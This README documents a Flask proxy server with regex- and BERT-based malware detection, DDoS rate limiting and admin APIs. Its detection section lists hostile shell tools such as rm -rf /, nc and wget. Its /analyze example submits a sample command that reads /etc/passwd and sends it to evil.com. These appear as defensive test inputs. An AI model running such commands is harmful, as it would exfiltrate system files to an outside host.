# Flask Proxy Server with Malware-BERT

A flexible HTTP proxy server built with Flask that can forward requests to any target URL while providing security controls, logging, and **AI-powered malware detection** using Malware-BERT.

## Features

- **Universal Proxy**: Forward any HTTP method (GET, POST, PUT, DELETE, etc.) to any target URL
- **AI-Powered Malware Detection**: Real-time analysis using Malware-BERT transformer model
- **Pattern-Based Detection**: Detects shell commands, encoded payloads, suspicious URLs, and script injection
- **Comprehensive DDoS Protection**: Production-ready rate limiting and attack prevention
- **Security Controls**: URL validation, host allowlisting, and path blocking
- **Request/Response Forwarding**: Preserves headers and request body
- **Real-Time Blocking**: Automatically blocks malicious requests and responses
- **Error Handling**: Comprehensive error handling with appropriate HTTP status codes
- **Logging**: Request logging for monitoring and debugging
- **Health Check**: Built-in health check endpoint
- **Configuration**: Runtime configuration viewing
- **Admin API**: Management endpoints for monitoring and configuration

## Malware-BERT Detection

The proxy includes an AI-powered malware detection system that analyzes:

### Detected Patterns
- **Shell Commands**: `rm -rf /`, `curl`, `wget`, `nc`, `bash`, `powershell`
- **Encoded Payloads**: Base64, hex, URL-encoded data
- **Suspicious URLs**: URL shorteners, suspicious TLDs, IP addresses
- **Script Injection**: `<script>` tags, `javascript:`, `eval()` functions
- **Network C2 Patterns**: Beaconing, data exfiltration commands
- **File Operations**: Destructive commands, persistence mechanisms

### Threat Levels
- **Clean**: Benign text/code
- **Suspicious**: Partial indicators (encoded strings, suspicious imports)
- **Malicious**: Clearly malicious payloads

### Detection Methods
1. **Pattern-Based**: Regex patterns for known attack vectors
2. **ML-Based**: BERT transformer model trained on malware samples
3. **Combined**: Both methods working together for maximum accuracy

## DDoS Protection Features

The proxy includes comprehensive DDoS protection with the following capabilities:

### Rate Limiting
- **Per-IP Limits**: Configurable requests per minute/hour/day
- **Per-Endpoint Limits**: Custom limits for specific endpoints
- **Sliding Window**: Token bucket algorithm for fair rate limiting
- **Redis Support**: Distributed rate limiting across multiple instances

### Connection Management
- **Concurrent Limits**: Maximum connections per IP
- **Connection Tracking**: Real-time connection monitoring
- **Slowloris Protection**: Detection of slow request attacks
- **Timeout Management**: Configurable request timeouts

### Request Validation
- **Size Limits**: Maximum request and header sizes
- **Content Validation**: Malware scanning of request/response content
- **Header Sanitization**: Removal of hop-by-hop headers
- **URL Validation**: Only HTTP/HTTPS URLs allowed

### IP Management
- **Allowlist/Blocklist**: Permanent IP management
- **Automatic Blocking**: Temporary blocking after violations
- **Violation Tracking**: Count and track rate limit violations
- **Admin API**: Programmatic IP management

### Monitoring & Administration
- **Real-Time Stats**: Live monitoring of protection metrics
- **Admin Endpoints**: RESTful API for management
- **Detailed Logging**: Comprehensive attack logging
- **Health Checks**: System health monitoring

## Installation

### Using Docker Compose (Recommended)

1. Clone this repository
2. Start the services:
   ```bash
   docker-compose up -d
   ```
3. Access the proxy at `http://localhost:8080`
4. Optional: Access Redis Commander at `http://localhost:8081`

### Using uv (Development)

1. Install [uv](https://docs.astral.sh/uv/getting-started/installation/) if you haven't already
2. Clone or download this repository
3. Install dependencies:
   ```bash
   uv sync
   ```

### Using pip (Alternative)

1. Clone or download this repository
2. Install dependencies:
   ```bash
   pip install flask requests werkzeug flask-limiter redis python-dotenv
   ```

## Usage

### Basic Usage

Start the proxy server:

**Using uv:**
```bash
uv run python app.py
```

**Using pip:**
```bash
python app.py
```

The server will start on `http://localhost:8080`

### Proxy Requests

Use the `target` query parameter to specify the destination URL:

```bash
# GET request to GitHub API
curl "http://localhost:8080/?target=https://api.github.com/users/octocat"

# POST request with JSON data
curl -X POST "http://localhost:8080/?target=https://httpbin.org/post" \
  -H "Content-Type: application/json" \
  -d '{"key": "value"}'

# Request with path
curl "http://localhost:8080/users/123?target=https://jsonplaceholder.typicode.com"
```

### Special Endpoints

- **Health Check**: `GET /health` - Returns server status
- **Configuration**: `GET /config` - Shows current configuration
- **Malware Analysis**: `POST /analyze` - Analyze text content for malware
- **File Scanning**: `POST /scan` - Scan uploaded files for malware
- **Detection Patterns**: `GET /patterns` - View available detection patterns

### DDoS Protection Admin Endpoints

- **Statistics**: `GET /admin/ddos/stats` - View protection statistics
- **IP Management**: `GET /admin/ddos/ips` - View IP statistics
- **Block IP**: `POST /admin/ddos/block/<ip>` - Block an IP address
- **Unblock IP**: `POST /admin/ddos/unblock/<ip>` - Unblock an IP address
- **Allowlist**: `POST /admin/ddos/allowlist/<ip>` - Add IP to allowlist
- **Blocklist**: `POST /admin/ddos/blocklist/<ip>` - Add IP to blocklist
- **Configuration**: `GET/POST /admin/ddos/config` - View/update configuration

### Malware Detection API

**Analyze Text Content:**
```bash
curl -X POST "http://localhost:8080/analyze" \
  -H "Content-Type: application/json" \
  -d '{"content": "curl https://evil.com --data \"$(cat /etc/passwd)\"", "use_ml": true}'
```

**Scan File:**
```bash
curl -X POST "http://localhost:8080/scan" \
  -F "file=@suspicious_script.sh"
```

**Get Detection Patterns:**
```bash
curl "http://localhost:8080/patterns"
```

### DDoS Protection API Examples

**View Protection Statistics:**
```bash
curl "http://localhost:8080/admin/ddos/stats"
```

**Block an IP Address:**
```bash
curl -X POST "http://localhost:8080/admin/ddos/block/192.168.1.100" \
  -H "Content-Type: application/json" \
  -d '{"duration": 300}'
```

**Add IP to Allowlist:**
```bash
curl -X POST "http://localhost:8080/admin/ddos/allowlist/192.168.1.50"
```

**View Current Configuration:**
```bash
curl "http://localhost:8080/admin/ddos/config"
```

## Configuration

### Environment Variables

The application can be configured using environment variables. See `ddos_config_examples.env` for comprehensive examples.

**Basic Configuration:**
- `DEFAULT_TARGET_URL`: Default target when no target is specified
- `ALLOWED_HOSTS`: Comma-separated list of allowed hostnames
- `BLOCKED_PATHS`: Comma-separated list of paths to block

**DDoS Protection Configuration:**
- `DDOS_REQUESTS_PER_MINUTE`: Requests per minute per IP (default: 60)
- `DDOS_REQUESTS_PER_HOUR`: Requests per hour per IP (default: 1000)
- `DDOS_REQUESTS_PER_DAY`: Requests per day per IP (default: 10000)
- `DDOS_MAX_CONNECTIONS`: Max concurrent connections per IP (default: 10)
- `DDOS_MAX_REQUEST_SIZE`: Max request size in bytes (default: 10MB)
- `DDOS_MAX_HEADER_SIZE`: Max header size in bytes (default: 8KB)
- `DDOS_BLOCK_DURATION`: Block duration in seconds (default: 300)
- `DDOS_MAX_VIOLATIONS`: Violations before auto-block (default: 5)

**Redis Configuration:**
- `DDOS_REDIS_ENABLED`: Enable Redis for distributed limiting (default: false)
- `DDOS_REDIS_URL`: Redis connection URL (default: redis://localhost:6379/0)

**IP Management:**
- `DDOS_ALLOWLIST`: Comma-separated list of allowed IPs
- `DDOS_BLOCKLIST`: Comma-separated list of blocked IPs

## Security Features

1. **URL Validation**: Only allows HTTP/HTTPS URLs
2. **Host Filtering**: Optional host allowlisting
3. **Path Blocking**: Block specific paths
4. **Header Sanitization**: Removes hop-by-hop headers
5. **Timeout Protection**: 30-second request timeout

## Examples

### Test with httpbin.org
```bash
# Test GET request
curl "http://localhost:8080/?target=https://httpbin.org/get"

# Test POST request
curl -X POST "http://localhost:8080/?target=https://httpbin.org/post" \
  -H "Content-Type: application/json" \
  -d '{"message": "Hello World"}'

# Test with query parameters
curl "http://localhost:8080/?target=https://httpbin.org/get&param1=value1&param2=value2"
```

### Test with different APIs
```bash
# GitHub API
curl "http://localhost:8080/?target=https://api.github.com/repos/microsoft/vscode"

# JSONPlaceholder API
curl "http://localhost:8080/posts/1?target=https://jsonplaceholder.typicode.com"
```

## Error Handling

The proxy returns appropriate HTTP status codes:

- `400 Bad Request`: Unsafe or invalid URL
- `403 Forbidden`: Blocked path
- `502 Bad Gateway`: Connection failed
- `504 Gateway Timeout`: Request timeout
- `500 Internal Server Error`: Other errors

## Testing

### DDoS Protection Testing

Run the comprehensive test suite:

```bash
python test_ddos_protection.py
```

Test with custom server URL:
```bash
python test_ddos_protection.py --server-url http://localhost:8080
```

Generate detailed report:
```bash
python test_ddos_protection.py --report
```

### Manual Testing

Test rate limiting:
```bash
# This should trigger rate limiting after 5 requests
for i in {1..10}; do curl http://localhost:8080/health; done
```

Test connection limits:
```bash
# Run multiple concurrent requests
for i in {1..20}; do curl http://localhost:8080/health & done
```

Test IP blocking:
```bash
# Block an IP
curl -X POST "http://localhost:8080/admin/ddos/block/192.168.1.100"

# Try to access from blocked IP (if you can simulate it)
curl http://localhost:8080/health
```

## Development

To run in development mode with auto-reload:

**Using uv:**
```bash
uv run python app.py
```

**Using pip:**
```bash
export FLASK_ENV=development
python app.py
```

## Training Malware-BERT

To train the Malware-BERT model with your own data:

```bash
# Train the model
uv run python train_malware_bert.py

# The script will:
# 1. Generate synthetic training data
# 2. Train the BERT model
# 3. Evaluate performance
# 4. Save the trained model as malware_bert_model.pth
```

### Custom Training Data

Edit `train_malware_bert.py` to add your own training examples:

```python
# Add your own examples to the generate_training_data() function
clean_examples = [
    "Your clean examples here...",
]

suspicious_examples = [
    "Your suspicious examples here...",
]

malicious_examples = [
    "Your malicious examples here...",
]
```

## Production Deployment

For production, consider using a WSGI server like Gunicorn:

**Using uv:**
```bash
uv add gunicorn
uv run gunicorn -w 4 -b 0.0.0.0:8080 app:app
```

**Using pip:**
```bash
pip install gunicorn
gunicorn -w 4 -b 0.0.0.0:8080 app:app
```

## License

This project is open source and available under the MIT License.
